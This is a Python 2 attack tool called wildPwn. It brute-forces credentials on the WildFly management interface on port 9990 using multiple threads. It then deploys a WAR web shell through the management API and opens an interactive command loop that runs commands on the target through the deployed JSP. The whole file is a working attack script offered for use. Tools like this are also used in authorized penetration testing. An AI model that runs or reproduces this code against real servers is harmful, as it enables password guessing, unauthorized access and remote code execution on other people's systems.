#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Halil DALABASMAZ - BGA Security LLC

import json
import sys
import argparse
import requests
import random, string
from requests.auth import HTTPDigestAuth

import multiprocessing
import itertools
from multiprocessing.dummy import Pool as ThreadPool

parser  = argparse.ArgumentParser()

parser.add_argument("-m", required=True, action="store", dest="mode", help="Mode for tool, brute or deploy")
parser.add_argument("--target", required=True, action="store", dest="target", help="Target IP Address or Domain")
parser.add_argument("--threads", action="store", dest="threads", help="Thread value 1-10, default = 4", default=4, type=int)
parser.add_argument("--port", action="store", dest="port", help="Target Port for Accessing Deployments")
parser.add_argument("-user", action="store", dest="uList", help="Username List")
parser.add_argument("-pass", action="store", dest="pList", help="Password List")
parser.add_argument("-u", action="store", dest="userName", help="Username")
parser.add_argument("-p", action="store", dest="passWord", help="Password")
parser.add_argument("--proxy", action="store", dest="proxy", help="Proxy ")
parser.add_argument("--timeout", action="store", dest="timeout",type=int,default=5, help="Request timeout (default 5 sec) ")

args    = parser.parse_args()
mode    = args.mode
target  = args.target
port    = args.port
uList   = args.uList
pList   = args.pList
threads = args.threads
u       = args.userName
p       = args.passWord
proxy   = args.proxy
timeout = args.timeout

print '          _ _     _______ _    _ _   _ '
print '         (_) |   | | ___ \ |  | | \ | |'
print '__      ___| | __| | |_/ / |  | |  \| |'
print '\ \ /\ / / | |/ _` |  __/| |/\| | . ` |'
print ' \ V  V /| | | (_| | |   \  /\  / |\  |'
print '  \_/\_/ |_|_|\__,_\_|    \/  \/\_| \_/'
print 'Brute forcer and shell deployer for WildFly'
print ''
#pip install -U requests[socks]
proxies = {
    'http': proxy,
    'https': proxy
}

if proxy is None:
    print "proxy is not set"
else:
    print "Proxying via "+proxy

if mode == "brute":
    if threads >= 11:
        print "\033[91m\033[1m[!]\033[0m Threads value must be 10 or lower!"
        sys.exit()
    try:
        userList =open(uList, "r")
    except (IOError):
        print "\033[91m\033[1m[!]\033[0m Username list file not found, check your file name!"
        sys.exit()
    try:
        passList = open(pList, "r")
    except (IOError):
        print "\033[91m\033[1m[!]\033[0m Password list file not found, check your file name!"
        sys.exit()

    usernames   = list(userList.read().splitlines())
    passwords   = list(passList.read().splitlines())
    print "\033[94m\033[1m[*]\033[0m Loaded " + str(len(usernames)) + " usernames and " + str(len(passwords)) + " passwords."
    print "\033[94m\033[1m[*]\033[0m Trying all combinations with " + str(threads) + " threads..."
    def bruteForce(password, username):
        #print str(username) + str(password)
        tryComb     = requests.post("http://" + target +":9990/management", auth=HTTPDigestAuth(str(username), str(password)),proxies=proxies,timeout=timeout)
        statusCode  = tryComb.status_code

        if statusCode == 415:
            print "\033[92m\033[1m[+]\033[0m Credential Found => " + username + ":" + password
    pool = ThreadPool(threads)
    for x, y in [(x,y) for x in usernames for y in passwords]:
        pool.apply_async(bruteForce , (y, x))
    pool.close()
    pool.join()

elif mode == "deploy":
    payload = {"file": open("wildPwn.war", "rb")}
    request = requests.post("http://" + target + ":9990/management/add-content", auth=HTTPDigestAuth(u, p), files=payload,proxies=proxies,timeout=timeout)
    byteValue = request.json()["result"]["BYTES_VALUE"]
    postData = '{"address":[{"deployment":"wildPwn.war"}],"operation":"add","runtime-name":"wildPwn.war","content":[{"hash":{"BYTES_VALUE":"' + byteValue + '"}}],"name":"wildPwn.war","enabled":"true"}'
    print "\033[94m\033[1m[*]\033[0m Uploading and getting BYTES_VALUES value..."
    deployHeader    = {"Content-Type": "application/json"}
    deployPayload   = requests.post("http://" + target + ":9990/management", headers=deployHeader, auth=HTTPDigestAuth(u, p), data=postData,proxies=proxies,timeout=timeout)

    print "\033[94m\033[1m[*]\033[0m Triggering payload..."
    print "\033[92m\033[1m[+]\033[0m Everything is OK, GO!\n"

    while True:
            cmd = raw_input("shell > ")

            if cmd.strip() == "exit":
                print "\033[94m\033[1m[*]\033[0m Removing deployed shell..."
                undeployData    = '{"operation":"remove", "address":[{"deployment":"wildPwn.war"}]}'
                undeployPayload = requests.post("http://" + target + ":9990/management", headers=deployHeader, auth=HTTPDigestAuth(u, p), data=undeployData,proxies=proxies,timeout=timeout)
                checkUndeploy   = requests.get("http://" + target + ":" + port + "/wildPwn/wildPwn.jsp?",proxies=proxies,timeout=timeout)
                if checkUndeploy.status_code != 200:
                    print "\033[92m\033[1m[+]\033[0m Deployment succesfully removed."
                    sys.exit()
                else:
                    print "\033[91m\033[1m[!]\033[0m Deployment cannot remove, please try to manual removing or try again with 'exit' command."
            else:
                cmdRequest = requests.get("http://" + str(target) + ":" + str(port) + "/wildPwn/wildPwn.jsp?cmd=" + str(cmd))
                print cmdRequest.text
